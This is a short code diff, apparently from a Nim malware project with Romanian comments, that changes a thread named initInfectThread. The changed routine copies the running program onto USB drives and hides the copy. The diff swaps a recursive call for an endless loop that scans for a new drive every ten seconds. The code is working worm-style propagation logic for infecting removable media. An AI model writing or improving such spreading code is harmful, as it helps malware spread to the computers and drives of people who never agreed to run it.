@@ -283,11 +283,12 @@ proc searchForUSB(): void =
           copyFile(appName, dest)
           hideFile(dest)
           checkDrive(dest, drivePath)
-  sleep(1000)
-  searchForUSB()
 
 proc initInfectThread*(): void {.thread.} =
-  ## TODO: SCOATE VARIANTA RECURSIVA DE AICI
   CoInitialize(nil)
-  searchForUSB()
+
+  while true:
+    searchForUSB()
+    sleep(10000) # la fiecare 10 sec cauta un usb
+
   CoUninitialize()
